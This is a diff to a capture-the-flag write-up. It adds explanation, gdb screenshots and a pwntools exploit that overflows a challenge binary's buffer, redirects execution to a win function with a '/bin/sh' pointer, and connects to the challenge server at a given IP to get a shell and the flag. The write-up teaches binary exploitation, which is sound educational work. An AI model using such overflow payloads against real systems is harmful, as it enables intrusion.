@@ -182,7 +182,7 @@ challenge = ELF(r'/mnt/c/Users/ssamu/Downloads/qutwh-pwn-challenge-main/challeng
 p = next(challenge.search(b"/bin/sh"))
 print(p) # Prints 134520901, the decimal representation of 0x804A045
 ```
-Alright, the pointer to "/bin/sh" is `0x804A045`, now lets build our payload.
+Alright, the pointer to "/bin/sh" is `0x804A045`, now lets build our payload. We'll need to use pwntools here because we want to send these addresses as raw bytes, which isn't possible with just your keyboard. It also gives us a nice way to program this, making it consistent and repeatable. Here's what our script will look like,
 ```py
 from pwn import *
 
@@ -199,3 +199,31 @@ p = challenge.process() #Start the binary
 p.sendline(payload) #Send the payload as input
 p.interactive() #Change to interactive mode so we can interact with the shell
 ```
+Let's look at what our registers look like in gdb when we use this payload.
+
+![image](https://user-images.githubusercontent.com/104875856/185727741-eb57403e-3a5c-4926-a655-0b566aa7bac8.png)
+
+Hey! So gdb shows us that our EAX register is pointing to "/bin/sh", and that our EIP instruction pointer is set to `0x080491d5`! Awesome!
+And, if you pay close attention gdb shows the assembly that EIP is pointing too, it's about to execute `push eax`! So now if we let this run,
+
+![image](https://user-images.githubusercontent.com/104875856/185727837-9eb62ccc-2d11-4880-8a42-51284172b2cb.png)
+
+Woooo, we can run `id` and see that we got our exploit working locally. I did mention that we'll have to run this on a server at some point to get the flag. So now lets rewrite our exploit, but for a remote connection.
+
+```py
+from pwn import *
+
+win_address = 0x080491d5
+bin_param = 0x804A045
+
+payload = b'A'*(40) + p32(bin_param) + b'A'*(12) + p32(win_address) + b"\n"
+
+i = remote("139.180.162.37", 9000) #Connect using the server info given in the README of the challenge
+i.send(payload) #Send our payload
+i.interactive() #Switch to interactive mode so we can use the shell
+```
+Running this...
+
+![image](https://user-images.githubusercontent.com/104875856/185727922-9bac3e74-0fdf-4263-8737-d8b14e7f8527.png)
+
+Wooooo! We got the flag!
